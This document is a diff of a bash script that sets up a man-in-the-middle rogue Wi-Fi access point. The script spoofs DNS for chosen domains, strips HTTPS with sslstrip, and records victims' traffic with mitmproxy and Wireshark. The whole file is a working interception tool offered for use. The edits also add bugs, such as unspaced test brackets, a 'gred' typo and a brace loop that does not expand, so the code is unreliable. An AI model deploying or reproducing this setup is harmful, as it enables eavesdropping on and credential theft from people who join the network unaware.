@@ -1,21 +1,24 @@
 #!/bin/bash
+#Man in the Middle Access Point
 
 echo $'\n[>] Man in the Middle Access Point'
 
 
 #-|-------------- Dependencies --------------|-
 
-read -p "  [?] Install/Update dependencies? (y/n) " depen_if 
-if ["$depen_if" == "y"]
+read -p "  [?] Install/Update dependencies? (y/n) " depen_if
+if [ $depen_if == 'y' ];
 then
-	echo " [I] Checking/Installing dependencies, please wait..."
+	echo "  [I] Checking/Installing dependencies, please wait..."
 	apt-get -qq -y install dnsmasq mitmproxy hostapd screen wondershaper sslstrip &>/dev/null
-	echo "  [I] System upgraded." 
+	echo "  [I] Dependencies installed."
 fi
 
 
 #-|----------- Wireless Interface -----------|-
 
+echo "Listing interfaces..."
+netstat -i | tail -n +3 | awk '{print $1}'
 read -p "  [?] Please enter the desired name of your wireless interface (for the AP): " ap_iface
 read -p "  [?] Please enter the name of your internet connected interface: " net_iface
 # echo this variable with escape characters
@@ -28,7 +31,7 @@ ifconfig $ap_iface up
 #-|----------------- DNSMASQ ----------------|-
 
 read -p "  [?] Create new DNSMASQ config file at '/etc/dnsmasq.conf'? (y/n) " dnsmasq_if 
-if ["$dnsmasq_if" == "y"]
+if ["$dnsmasq_if" == "y"];
 then
 	# echo this variable with escape characters
 	dnsmasq_file="# Stops dnsmaq from reading any other files like /etc/resolv.conf for nameservers\nno-resolv\n# Interface to bind to\ninterface='$ap_iface$'\n# Specify starting_range,end_range,lease_time\ndhcp-range=10.0.0.3,10.0.0.20,12h\n# DNS addresses to send to the clients\nserver=8.8.8.8\nserver=8.8.4.4"
@@ -44,12 +47,14 @@ fi
 #-|----------------- HOSTAPD ----------------|-
 
 read -p "  [?] Create new HOSTAPD config file at '/etc/hostapd/hostapd.conf'? (y/n) " hostapd_if
-if ["$hostapd_if" == "y"]
+if ["$hostapd_if" == "y"];
 then
+	echo "  [I] Listing available SSIDs"
+	iw dev $ap_iface scan | gred SSID | awk '{print $2}'
 	read -p "  [?] Please enter the SSID for the AP: " ssid
 	read -p "  [?] Please enter the channel for the AP: " channel
 	read -p "  [?] Enable WPA2 encryption? (y/n) " wpa_if
-	if ["$wpa_if" == "y"]
+	if ["$wpa_if" == "y"];
 	then
 		read "  [?] Please enter the WPA2 passphrase for the AP: " wpa_passphrase
 		# echo this variable with escape characters
@@ -86,35 +91,34 @@ iptables --append FORWARD --in-interface $ap_iface -j ACCEPT
 #-|-------------- Speed Limit ---------------|-
 
 read -p "  [?] Set speed limit for the clients? (y/n) " speed_if
-if ["$speed_if" == "y"]
+if ["$speed_if" == "y"];
 then
 	read -p "  [?] Download speed limit (in KB/s): " speed_down
 	# One day I'll make it so that it checks that a number was inputed, today is not that day.
+	if [-n $speed_down]; then echo "Yay you put in a number"; fi # There you go. Checks if length of $speed_down is non-zero.
 	read -p "  [?] Upload speed limit (in KB/s): " speed_up
 	echo "  [I] Setting speed limit on "$ap_iface"..."
 	wondershaper $ap_iface $speed_up $speed_down
 else
 	echo "  [I] Skipping..."
-
+fi
 
 #-|---------------- DNS Spoof ---------------|-
 
 read -p "  [?] Spoof DNS? (y/n) " spoof_if
-if ["$spoof_if" == "y"]
+if ["$spoof_if" == "y"];
 then
 	read -p "  [?] How many domains do you want to spoof?: " dns_num
 	echo "  [I] Backing up /etc/dnsmasq.conf"
 	cp /etc/dnsmasq.conf /etc/dnsmasq.conf.backup
-	# I'm not too sure this while loop is made correctly
-	i=0
-	while [ $i != $dns_num ]
+	# I'm not too sure this while loop is made correctly ##fixed it for you
+	for i in {0..$dns_num};
 	do
 		dns_num_temp=$((i+1))
-		read -p "  [?] "$dns_num_temp". Domain to spoof (exclude: 'www.'): " dns_domain
+		read -p "  [?] "$((dns_num_temp+1))". Domain to spoof (exclude: 'www.'): " dns_domain
 		read -p "  [?] Fake IP for domain "$dns_domain": " dns_ip
 		dns_line="address=/"$dns_domain"/"$dns_ip
 		echo -e $dns_line >> /etc/dnsmasq.conf
-		i=$((i+1))
 	done
 else
 	echo "  [I] Skipping..."
@@ -127,7 +131,7 @@ dnsmasq
 #-|-------------- SSL Stripping -------------|-
 
 read -p "  [?] Use SSLSTRIP? (y/n) " sslstrip_if
-if ["$sslstrip_if" == "y"]
+if ["$sslstrip_if" == "y"];
 then
 	proxy_if="n"
 	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9000
@@ -135,13 +139,13 @@ then
 	echo -e "  [I] Starting AP on "$ap_iface" in screen terminal...\n"
 	screen -S mitmap-hostapd -m -d hostapd /etc/hostapd/hostapd.conf
 	screen -S mitmap-sslstrip -m -d sslstrip -l 9000 -w mitmap-sslstrip.log
-	read -p "  [?] START WIRESHARK? (y/n) " wireshark
-	if ["$wireshark" == "y"]
+	read -p "  [?] Start Wireshark? (y/n) " wireshark
+	if ["$wireshark" == "y"];
 	then
-		echo "  [I] Starting WIRESHARK..."
+		echo "  [I] Starting Wireshark..."
 		screen -S mitmap-wireshark -m -d wireshark -i $ap_iface -k -w mitmap-wireshark.pcap
 	fi
-	echo -e "TAIL started on mitmap-sslstrip.log... Wait for output... (press 'CTRL + C' to stop)\n"
+	echo -e "TAIL started on mitmap-sslstrip.log... Wait for output... (press '^C' to stop)\n"
 	sleep 5
 	tail -f mitmap-sslstrip.log
 
@@ -150,10 +154,10 @@ then
 
 else
 	read -p "  [?] Capture traffic? (y/n) " proxy_if
-	if ["$proxy_if" == "y"]
+	if ["$proxy_if" == "y"];
 	then
 		read -p "  [?] Capture HTTPS traffic too? (Need to install certificate on device) (y/n) " proxy_config
-		if ["$proxy_config" == "y"]
+		if ["$proxy_config" == "y"];
 		then
 			echo "  [I] To install the certificate, go to 'http://mitm.it/' through mitmproxy and choose your OS."
 			iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
@@ -163,10 +167,10 @@ else
 		fi
 		sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1
 		echo -e "  [I] Starting AP on "$ap_iface" in screen terminal...\n"
-		read -p "  [?] START WIRESHARK? (y/n) " wireshark
-		if ["$wireshark" == "y"]
+		read -p "  [?] Start Wireshark? (y/n) " wireshark
+		if ["$wireshark" == "y"];
 		then
-			echo "  [I] Starting WIRESHARK..."
+			echo "  [I] Starting Wireshark..."
 			screen -S mitmap-wireshark -m -d wireshark -i $ap_iface -k -w mitmap-wireshark.pcap
 		fi
 		screen -S mitmap-hostapd -m -d hostapd /etc/hostapd/hostapd.conf
@@ -175,10 +179,10 @@ else
 		mitmproxy -T -w mitmap-proxy.mitmproxy
 	else
 		echo "  [I] Skipping..."
-		read -p "  [?] START WIRESHARK? (y/n) " wireshark
-		if ["$wireshark" == "y"]
+		read -p "  [?] Start Wireshark? (y/n) " wireshark
+		if ["$wireshark" == "y"];
 		then
-			echo "  [I] Starting WIRESHARK..."
+			echo "  [I] Starting Wireshark..."
 			screen -S mitmap-wireshark -m -d wireshark -i $ap_iface -k -w mitmap-wireshark.pcap
 		fi
 		sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1
@@ -191,14 +195,14 @@ fi
 
 echo ""
 echo "  [!] Stopping..."
-if ["$sslstrip_if" == "y" || "$proxy_if" == "y" || "$wireshark" == "y"]
+if ["$sslstrip_if" == "y" || "$proxy_if" == "y" || "$wireshark" == "y"];
 then
 	screen -S mitmap-hostapd -X stuff '^C\n'
-	if ["$sslstrip_if" == "y"]
+	if ["$sslstrip_if" == "y"];
 	then
 		screen -S mitmap-sslstrip -X stuff '^C\n'
 	fi
-	if ["$wireshark" == "y"]
+	if ["$wireshark" == "y"];
 	then
 		screen -S mitmap-wireshark -X stuff '^C\n'
 	fi
@@ -212,17 +216,17 @@ echo "  [I] Deleting old dnsmasq.hosts..."
 mv /etc/dnsmasq.hosts > /dev/null 2>&1
 echo "  [I] Removing speed limit from"$ap_iface"..."
 wondershaper clear $ap_iface > /dev/null 2>&1
-if ["$proxy_if" == "y"]
+if ["$proxy_if" == "y"];
 then
-	if ["$wireshark" == "y"]
+	if ["$wireshark" == "y"];
 	then
 		echo "  [I] Traffic has been saved to the file 'mitmap-proxy.mitmproxy' and to the file 'mitmap-wireshark.pcap'. View the '.mitmproxy' file later with 'mitmproxy -r [file]'."
 	fi
 	echo "  [I] Traffic has been saved to the file 'mitmap-proxy.mitmproxy'. View the file later with 'mitmproxy -r [file]'."
 fi
-if ["$sslstrip_if" == "y"]
+if ["$sslstrip_if" == "y"];
 then
-	if ["$wireshark" == "y"]
+	if ["$wireshark" == "y"];
 	then
 		echo "  [I] Traffic has been saved to the file 'mitmap-sslstrip.log' and to the file 'mitmap-wireshark.pcap'."
 	fi
